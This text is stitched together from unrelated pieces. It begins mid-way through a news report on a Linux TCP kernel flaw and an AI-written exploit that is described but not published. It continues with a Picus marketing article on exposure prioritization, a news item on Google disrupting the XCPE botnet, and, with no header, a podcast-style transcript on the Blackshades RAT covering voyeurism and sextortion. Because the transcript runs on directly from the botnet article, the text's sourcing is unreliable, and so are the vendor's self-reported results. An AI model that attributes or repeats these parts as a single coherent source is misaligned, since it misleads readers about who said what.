Several sources have recommended disabling Multipath TCP (MPTCP) as a workaround. The flaw is in the IPv4 TCP path, not in MPTCP, and that advice alone is not enough, Canonical said. "The Ubuntu Security Team believes that security updates are the only appropriate mitigation."

Exploitation Status

No vendor, CERT, or the kernel CVE team has reported attacks using this flaw. It was not listed in CISA's Known Exploited Vulnerabilities catalog as of the catalog's October 30 release.

Anthropic said on October 27 that an unreleased, internal Claude research model wrote a remote root exploit for the flaw that works against Linux servers with an MPTCP listener, with no credentials and no user interaction. In its proof of concept, leaking a kernel address took 48 minutes and reaching a root shell took another 5 minutes. Anthropic has not published the exploit code.

Proof-only code that triggers the race and detects the kernel echoing freed memory in a SYN-ACK has appeared on GitHub. It does not implement code execution.

Amazon Linux scored the flaw 8.1 and rated it Important, saying the main outcome is a crash with possible memory corruption. Debian, Oracle Linux, and SUSE shipped fixes in October. Amazon Linux was fixed across all packages between October 24 and 30.

articles.title: The 4 Elements of Exposure Prioritization and How to Operationalize Them
articles.context: Gartner predicts that by 2028, organizations that prioritize exposures using threat intelligence, asset context, exploitability modeling, and security control validation will...
articles.full_text:
Your team is remediating more vulnerabilities than ever, yet your breach risk has barely changed. You’re spending too much time and effort on exposures attackers may never exploit, while higher-risk exposures sit, waiting in the queue. Gartner®’s report on exposure prioritization states that fewer than 10% of vulnerabilities are exploited, yet most are treated as urgent. The report also argues that CVSS scores alone do not predict actual exploitation or business impact.

Gartner predicts that by 2028, organizations that prioritize exposures using threat intelligence, asset context, exploitability modeling, and security control validation will reduce breach likelihood by at least 70% compared to their peers relying primarily on CVSS-based vulnerability prioritization. Let’s break down how each element works, and how the Picus Platform puts all four into practice.

Severity-based prioritization made sense. Then it didn't.

Severity-driven prioritization was an entirely rational response for the era it was built in: a static attack surface, scarce adversary tooling, and remediation capacity that exceeded disclosure volume. Suddenly, that world is gone. Enterprises face tens of thousands of new vulnerabilities a year across cloud, SaaS, identity, and supply chain modalities, and AI has compressed time-to-exploit from weeks or months to hours.

Gartner is candid about why teams still anchor on severity, and it’s not a lack of awareness. In fact:

legacy metrics

compliance pressure, and

fragmented ownership

all reward what’s auditable over what’s legitimately impactful.

The result is widespread prioritization paralysis, with significant resources being funneled into remediation activity, but with remarkably little measurable risk reduction to show for it.

The smarter path is performing risk-based vulnerability management in its truest sense: measuring success by the exploitable exposures you’ve reduced, not the hypothetical vulnerabilities you’ve closed.

The four elements, and the question each one answers

Gartner’s framework rests on four pillars, and their value emerges only when added together. Sure, operationalizing one or two will bring you incremental gains, but integrating all four delivers significant reductions in both exposure windows and remediation fatigue.

Each element answers a distinct question about an exposure:

An exposure deserves urgent remediation only when all four answers converge.

The model aligns directly with the prioritization and validation stages of continuous threat exposure management (CTEM): remediation is mobilized only after priorities are validated in context.

Element 1: Threat Intelligence

Threat intelligence brings the adversary’s perspective into prioritization by showing which exposures attackers are actually exploiting. In real-world environments, many high-severity vulnerabilities are never exploited. Attackers frequently weaponize moderately rated vulnerabilities because they are easier to exploit, affect widely used systems, or can be exploited reliably. Past exploitation evidence helps teams focus their remediation efforts on a smaller, higher-risk subset of the backlog.

The operational challenge here is speed. Your team needs to use that intelligence to decide what to test and fix before a campaign reaches your environment. Track the time it takes to go from threat publication to testing and remediation.

Element 2: Asset Context and Business Criticality

An exploitable vulnerability becomes materially risky when it affects an asset that supports critical business functions, processes regulated data, or provides an easy pivot to higher-value systems. Without asset context, prioritization treats all assets as equal, and attention can easily drift to low-impact systems while crown-jewel exposures wait in the same queue.

This context already lives in tools most teams own: scanners, CMDBs, cloud security platforms, and identity systems. The practical work is to both unify it and keep it current, so its impact reflects the asset as it’s defended today, not as it appears in an inventory.

Element 3: Exploitability Modeling

Exploit prediction models such as EPSS estimate how likely a vulnerability is to be exploited, based on patterns like exploit complexity, component prevalence, and disclosure-to-exploitation timelines. These models complement threat intelligence by surfacing latent and lingering risks: helping identify the exposures that are statistically likely to be exploited before exploitation is widely observed, enabling you to shift teams from a reactive to an anticipatory or even proactive stance.

Statistical likelihood describes the world in general, not your organization’s unique environment. EPSS points to what’s probably exploitable somewhere; only validation proves what is exploitable here and now. Exploitability modeling works best as a filter that feeds validation, not as a final verdict.

Gartner’s full report goes deeper into how EPSS, KEV and similar models should be weighted against threat intelligence and control validation. Download the Gartner report on exposure prioritization to read the complete analysis.

Element 4: Security Control Validation

This is the element most programs are missing. Security control validation evaluates each exposure against the defenses already deployed around it: segmentation, endpoint protection, detection coverage, and identity controls.

An exposure that looks critical may be practically unreachable behind your existing defenses, while a less critical one on a poorly monitored asset may carry far more risk than its score suggests. Ignoring control context, Gartner warns, leads to systematic overestimation of risk and the wasted remediation efforts that follow it.

Testing shows whether attackers can realistically exploit an exposure in your specific environment today. Gartner notes this capability can be achieved with adversarial exposure validation techniques: proving exploitability with evidence, through live attack execution where testing is safe, and attack-chain analysis against deployed controls where assets can’t be touched.

How Picus Operationalizes All Four Elements into a Single Loop

The sum here is indeed greater than its parts, but the four elements only deliver their full value when evaluated together. This is, not surprisingly, where most organizations struggle as vulnerability management grows into exposure management. Why? Because in most organizations, threat intelligence sits with one team, asset context with another, exploitability scores are in a scanner, and control effectiveness only shows up in periodic assessments. Four inputs in four places do not lead to one decision.

Picus is named among the vendors in the 2026 Gartner® Market Guide for Adversarial Exposure Validation. The Picus Platform brings all four elements together in a continuous loop: Discover, Validate, Prioritize, and Mobilize.

Here’s how the platform maps to each element.

Security control validation deserves a closer look, because evidence is what turns the other three elements from assumptions into decisions. Picus Breach and Attack Simulation is one of three validation methods on the platform.

Picus Autonomous Penetration Testing runs real exploit paths against reachable production assets and proves which ones lead to your critical systems.

Picus Exposure Validation breaks each CVE into the techniques an attacker must use and tests every step against your existing controls on that asset, with no exploit fired, so even assets you can never test live get an evidence-backed verdict.

Together, these three validation methods give every exposure one explainable, organization-specific rating.

What Good Looks Like: Measuring the Shift

If prioritization is working, you should be able to see it in three places: your controls hold up better, you respond faster, and your team spends its time on the exposures that matter, rather than wasting it on the ones that don’t.

Here’s what our customers are reporting.

Within three months of deploying Picus, their security controls are blocking or detecting roughly twice as many attacks as before.

Response time to emerging threats drops by 89%.

Missed remediation deadlines on high and critical vulnerabilities fall by 92%, because the queue now holds only the exposures proven to be exploitable.

One customer cut their critical ticket backlog by 98%. And the full cycle, from a new threat or change being detected to actual validated findings landing with the right team, runs under six hours.

A CISO at our 2026 Validation Summit put it simply: While a severity score is a useful label for sorting, the smarter strategy is to shut down those attack paths that could actually hurt your business. The numbers above back this up.

Exposure Prioritization Is a Risk Decision. Make It With Evidence.

Gartner frames exposure prioritization as a risk decision, and we agree.

Each of the four elements answers one part of it: threat intelligence tells you whether the exposure matters to an attacker, asset context tells you what it would cost you, exploitability modeling tells you how likely it is to take place, and security control validation tells you whether it could actually happen here.

The Picus Platform runs all four in one continuous loop, so every exposure ends in a decision you can defend to your board and your auditors: so you can fix it, mitigate it, or accept it with proof.

articles.title: Police and Tech Firms Team Up to Dismantle XCPE Botnet
articles.context: “We found this malicious software built directly into many different device models and brands over multiple years, supported by dedicated infrastructure and constantly evolving...
articles.full_text:
Google has banned a Chinese Android device maker and worked with partners to dismantle a botnet it helped to build containing more than 1.3 million set-top boxes, the tech giant has revealed.

In a blog post published on November 2, the Google Threat Intelligence Group (GTIG) said it assessed “with high confidence” that Android ODM/OEM Videostrong Technology was responsible for the XCPE botnet and backdoor.

“Videostrong monetized the backdoor by selling access to criminal affiliates and loading those affiliates’ malware modules onto infected devices,” it explained.

“These secondary modules were conducting ad-fraud; silently enrolling infected devices into residential proxy networks; and loading additional malware onto XCPE-compromised devices.”

Read more on botnets: Chinese Botnet Bypasses MFA in Microsoft 365 Attacks.

The industry action also disrupted XCPE command-and-control (C2) servers being used by criminal affiliates of Videostrong to install over a dozen malware families onto victims’ devices. This action helped to sever control of over 10 million of these compromised devices from the bot-herders, Google claimed.

“We found this malicious software built directly into many different device models and brands over multiple years, supported by dedicated infrastructure and constantly evolving configurations to evade detection and manage their affiliates,” the blog continued.

“We believe this campaign wasn’t an isolated rogue insider or a development oversight. As a result, Google has cut ties with Videostrong and banned them from making devices with preloaded Google apps.”

Aside from set-top boxes, the XCPE botnet included compromised telehealth devices, karaoke machines, and digital signage devices.

How XCPE Worked

Google claimed Videostrong had been selling devices with the XCPE backdoor embedded into the firmware for several years.

The backdoor itself, x.cpe, operated at android.uid.system privilege level and automatically reinstalls itself from the /oem/ partition on reboot if a user tries to get rid of it.

On startup it contacts a C2 server and uses MQTT message broker for commands, enabling affiliates to remotely perform malicious actions such as executing shell scripts, disabling Google Play Protect, and silently installing additional apps.

Videostrong sought to further monetize the backdoor access to compromised devices by installing malware modules from other operators including residential proxy service providers like Linkfog, AppSalt/Honeygain, GaGaNode, NetNut and Traffmonetizer.

These are another popular enabler of cybercrime including account takeover, payment fraud, ad/click fraud, web scraping and DDoS.

"While we believe our actions have seriously impacted over a dozen malicious actors, the underlying illicit market is resilient,” Google warned in closing.

“Backdoor operators, ad-fraud rings, and residential proxy providers operate as an interconnected supply chain, and when one component is disrupted, operators quickly pivot to new loaders or rival monetization SDKs. Creating lasting change requires accountability across the hardware supply chain, the residential proxy industry and the broader technology ecosystem.”

Remote access is like when you need computer help and IT support takes over your computer to fix something, or when you log into your home computer from a coffee shop. Every password, every credit card number, every private message went straight to the attacker. They could steal the log-ins to your bank, your e-mail, your social media accounts. They could turn your webcam and microphone on, and from there they can commit a litany of crimes; theft, extortion, blackmail, for example, but also wire fraud and identity theft. And it gets worse. So, the fact that this had a ransomware feature squarely puts it in the malicious software territory, if you're asking me, making it clearly illegal. But Blackshades would make their users click on a button stating that the user is responsible for whatever the action resulted in, and warning them to be careful when using this feature. It also said this was made for educational purposes only. Yeah, okay, sure. But there was one problem for Blackshades users. You couldn't just wave a wand at someone and infect their computer with Blackshades, and no one in their right mind would install this to give some random attacker full access to their computer. So, to get Blackshades on a victim’s machine, they had to trick the victim into installing it themselves, to make them think they're installing something else, and that’s tricky because you basically have to exploit another human to get it installed, which brings us into the world of social engineering, the art of tricking people into doing things they don't actually want to do. There are a 1001 ways that we can all be tricked into installing things that we don't actually want. Humans are a weak link when it comes to computer security. You might have seen some of them, obvious links; click here for a free iPhone, and you're like, yeah, nah, I’m not doing that. But sometimes it’s not so obvious. Since Blackshades can spread from a friend’s computer to yours using malicious links, it can look like it’s coming from someone you trust. They can also hide malware inside pirated software, games, or movies on peer-to-peer file-sharing sites. So, if you downloaded a cracked version of a video game that you didn't want to buy, Blackshades might come along for the ride and get installed with it. I should know, too. When I was a teenager I downloaded a lot of shady apps and games from shady parts of the internet, and I would constantly be dealing with infections. I didn't care because I really wanted to play the game, but eventually the infection would get so bad that I couldn't use my computer at all. Pop-ups would just constantly be showing up. The CPU would crawl to a standstill. I must have been hit with malware hundreds of times when I was a teenager. But that’s what got me good at fixing computers, learning how to find malware and remove it and cleaning up my computer. After a while I took pride in knowing there is no problem that I can't fix on my computer. Worst case is I could just reinstall the operating system if I had to, which I did a lot. I mean, a lot, a lot. Anyway, sometimes devices you buy in the store actually come with malware on them. There was a story I read once where a Chinese laptop maker was selling their laptops on Amazon that came with Windows 11. Well, the thing was the Chinese seller was trying to cut costs and didn't want to pay for Windows 11 license keys for every computer, so they found a pirated version of Windows, installed that, and shipped it with their laptops. Little did they know, the pirated version contained malware and was draining people’s crypto wallets and robbing their Steam accounts. So, you need to be really careful with what apps you install and where you get them from, because having one bad app on your computer can ruin you. But even apps you vet thoroughly can turn rogue. I’ve seen some popular browser extensions get purchased by someone who had malicious intent, and then they put spyware on people’s browsers without them knowing. Or maybe someone makes a simple mobile app that’s clean and fine and free, even. But as it grows in popularity, there’s always someone that asks them, hey, I’ll give you a few thousand dollars if you can put this widget in your app. Don't worry, it’s just an advertising pixel. If someone’s making free software and suddenly get offered a few thousand dollars to add a simple advertising pixel, they might say yes. Now suddenly that app, which was clean and good, now has some malicious code in it tracking what you're doing on your phone. Stuff can sneak into our devices from all kinds of directions. It’s a war out there. [Music] Then there’s USB sticks. If you put a USB stick into a computer, Windows will look at it and see if there’s a file called autorun.inf, and if so, it’ll run the commands in that file. So, if someone swings by your computer, pops a USB stick in the slot, it may auto-infect that machine. Then you could pull the USB stick out, and nobody knows what happened. Back in the days of Windows XP and Vista, this feature was on by default in Windows. Nowadays the Autorun feature is not on by default, thank goodness, but this was a popular way people would infect computers with Blackshades, since it was just dead simple to do. Just stick the USB stick in for a few seconds and pull it out, and you're done. I think the most popular way people were getting victims to install this is to send them a message saying, ‘Oh my god, is this you? How embarrassing!’ with a link to a photo or a video. Except it wasn't a photo or video. It’d look like it, but when you tried to open it, it was really a program that would install Blackshades. Another one, which I’ve actually seen in my own inbox, was something like, ‘We’ve tried to deliver a package to you three times now. We were unsuccessful. We're gonna send it back to the shipper unless you click here.’ I always have this knee-jerk reaction like, oh man, I don't want my package returned. Then I realize it’s to an e-mail I’ve never used for ordering things before. I’m like, oh, that’s a scam. They're trying to trick me. It came with a slick, little dashboard to show you every computer that you've infected, with icons telling you if there is a camera available on that computer or not. If you were the operator, you could simply point and click on the computer you wanted to see, and now you could see their desktop, files, and yeah, camera. I mean, you could see it all; people’s private messages, social media accounts, Google searches. It was spooky. [Music] There was this guy named Stefan Rigo from Leeds in the UK who saw what Blackshades could do, and he became interested. He was thirty-four years old. He bought it for forty bucks using his ex-girlfriend’s credit card, and then he infected his ex-girlfriend with this malware. Maybe he sent her a phishing chat message or plugged in a USB stick when he visited her house one day and she left the room or something. But when he was at his computer, he could see when her computer was online. Her computer had a camera on it, and from the dark comfort of his own house, he turned on her camera and watched her in her bedroom. He found it incredibly addicting. She had no idea he was watching her. Usually there’s a little light that comes on when your camera is on, right? Well, Blackshades made sure that light didn't come on. Watching her in her bedroom gave him a rush. He liked it. He had some other lady friends and wondered what they were doing, too. So, he started infecting more and more women that he knew with Blackshades. He could hear conversations people were having. He watched them get undressed. Of course, he’s taking screenshots of them changing and saving the recordings. He liked that kind of stuff the most. Stefan got seriously addicted to watching what women do in the privacy of their own homes. Every day he would open up his Blackshades dashboard and look to see what computers he infected were online, and then he’d double-click on one and sit there, watching what they were doing. Not only was he watching through the cameras, but when they'd use their computers, he’d watch what they were doing on it, too. He could see their passwords, their private messages with people, their photos, what they bought online, their online banking activity, everything they did on that computer. The thing that made it addicting to him was that he never knew when something interesting would happen or what would happen. To him it was like a wave of excitement when he actually saw someone changing in front of a camera. That would make it all worth the time to him. He started out by putting it on the computers of women he knew, but then he learned how to spread it from those computers to their friends’ computers, and now he was infecting other women that he didn't even know, and he didn't stop there. He was trying to infect other women, too, like people working in coffee shops or at a library. It was real easy for him just to put in a USB drive and try to infect someone’s laptop. He was seriously addicted to this, and over time he got over a dozen people infected with Blackshades. With that, there was always someone online doing something interesting that he liked watching. There’s a whole voyeurism fetish out there on the internet. People will secretly film women getting undressed and posting it online. Or maybe they’ll hold a camera under some lady’s skirt and take a photo of that and share it. Well, this voyeurism community was hearing about what you could do with Blackshades, and they were into it. The Blackshades RAT had incredible potential for secretly getting videos of women undressing or having sex. Soon the biggest user base of Blackshades were guys spying on girls to see them naked, and in most cases the guys were spying on the girls they knew, keeping tabs on exes, getting dirt on someone they're jealous of, or just spying on women because they found it fascinating. Over time, thousands of Blackshades users were using this tool to spy on women. It really helped Blackshades grow in popularity. But they weren't the only people interested in Blackshades. It was also used to target activists. In 2012, Syria was in the middle of a civil war. People were really upset with the president of Syria, Bashar al-Assad, for using chemical weapons on his own civilians. The country ignited in large-scale protest and pro-democracy rallies as part of the Arab Spring. In the midst of this, researchers at the Electronic Frontier Foundation and the Citizen Lab noticed that Syrian activists were getting hit with malware. They would get a link from a Skype account from someone they knew and trusted without realizing that account was compromised. One message read, ‘There’s a person who hates you, and he keeps talking about you. Here's a screenshot of the conversation.’ There was a link to the malicious file, and when they’d click it, Blackshades would install itself on their device. [Music] The Syrian government used Blackshades to spy on opposition activists and tried to suppress them by having total control of their computers. They could do things like get information on the next rally or delete social media accounts or look through photos and documents. Before Blackshades there was another tool called DarkComet. It was developed back in 2008 by a French programmer named Jean-Pierre Lesueur, also known as DarkCoderSc. He discontinued the program partially due to its use in the Syrian civil war and possibly due to the fear of him being arrested. Like Blackshades, DarkComet was used to spy on victims through key-logging, screen captures, and by stealing their passwords. To me, this is really fascinating because at the time, a lot of activists within the hacker group Anonymous were very active in the Arab Spring trying to help the protesters from afar by knocking the government offline and doing stuff like that, and it’s wild that the very people who wanted to assist the protesters are also the ones who are accidentally assisting the government to suppress the protesters, because tools are typically neutral and can be used by either side. When you make something so effective, people will notice it on both sides and use it for their own agenda. I don't have any knowledge of whether the creators of DarkComet or Blackshades were members of Anonymous, and it wouldn't surprise me if they were, because, well, at least the maker of DarkComet said some stuff online that looked a lot like what the Anonymous activists were saying about Syria at the time. So, this was yet another thing this malware was being used for. A $40 piece of software marketed to suspicious spouses and parents was being used to find dissidents during a war. Which, by the way, government intelligence units love using off-the-shelf tools to conduct their spying, since they don't have to burn any of their trade craft to conduct their tasks. A $40 off-the-shelf tool is way cheaper than spending a lot of time and energy developing their own tool to do the same thing. By this time Blackshades was becoming well known in the hacker communities. Hundreds of people were buying it and infecting thousands of machines with it, which also meant the victims were waking up to the nightmare happening to their computers. Victims would often get extortion e-mails where they would receive an embarrassing photo of them with some kind of demand. The obvious demand is to pay some Bitcoin and we’ll delete it, but some were downright evil. Like, people would send a half-naked photo to their victim and say, ‘Send me a fully-nude photo or I’m posting this on your own social media account. Let me show you that I have access to it.’ Then they would post a test message to prove it. It would rattle a lot of these women, and they would sometimes send the pictures that were demanded simply out of fear. [Music] Sometimes the attacker would catch a picture of their victim having sex and send them a picture of that and demand a video call over Skype, and they'd ask the women to do a five-minute sex show for them on camera as part of the ransom demand. If they didn't do it, the attacker had access to all their social media accounts and said they'd post something really terrible if they didn't to it. Blackshades was a growing problem, and victims were being almost entirely silent about the matter due to all the embarrassment and fear. I hate to say it, but it’s possible that some women died by suicide because of this. I didn't see any specific stories about that happening with Blackshades, but I’ve seen countless stories where online bullying and abuse and harassment has led to women feeling so desperate that they'd rather die than face the embarrassment or harassment anymore. It’s really tragic. We're gonna take a quick ad break, but stay with us because this is where the FBI starts to get involved. The FBI started rooting around in some hacker forums looking for crime, but they weren't focused on this. Not yet, at least. They were focused on stuff like credit card fraud and online fraud. In 2010 the FBI decided to go on the dark web and build their own stolen credit card exchange. They were hoping thieves would come and sell stolen cards and people would buy them, and then the FBI would catch them in the act. It’s wild to me that the FBI built their own carders market on the dark web, a honeypot to trap people. Not only could you buy and sell stolen credit cards there, but they sold tools for stealing credit cards, too. However, dark web forums like this only work when there’s trust, so the FBI, which was acting like dark web operators, said they’ll verify every tool before it’s allowed to be sold on the site. So, for instance, if you wanted to sell a credit card scraper, the FBI would have to vet you as a seller first. Send us one and we’ll test it, and if it’s good, we’ll approve you as a vendor. The administrators were either undercover agents or confidential sources in the investigation. They were reviewing these products to get evidence of criminal activity and to investigate the hardware, software, and methods used. The FBI was looking for credit card fraud, but then the co-creator of Blackshades, Michael Hogue, wanted to become a vendor on this forum. [Music] So, he submitted his tool, Blackshades, to show them that he has a real tool that can be used to scrape credit card data. He had no idea he was pitching the FBI. It’s kind of ironic that the co-creator of Blackshades fell for a social engineering trap himself. See? Even he’s susceptible to that. The FBI couldn't believe Michael sent them his malware. This was clear evidence of his intent, to sell Blackshades to criminals. All that language that this was only for educational purposes or for a parent to monitor their kid wasn't gonna fly anymore. When you're selling it to criminals on a dark web forum to steal credit card data with, then that’s clear intent. In 2012, the trap snapped shut. The FBI ran a sting operation called Operation Card Shop. It led to twenty-four arrests in eight countries. Almost all of these arrests were for credit card fraud, but there was one exception. One of the people arrested was Michael Hogue, the maker of Blackshades. He was charged under the Computer Fraud and Abuse Act for conspiracy to commit computer hacking and transmission of malware. Writing and selling software isn't illegal, but writing and selling software with the intent of logging keystrokes, ransomwaring files, stealing credit cards, and spying on webcams without consent is illegal. Hogue cooperated with investigators, which meant he avoided prison entirely. He was sentenced to five years of probation and he was ordered to forfeit $40,000, and had to perform 500 hours of community service. So, that’s it, right?
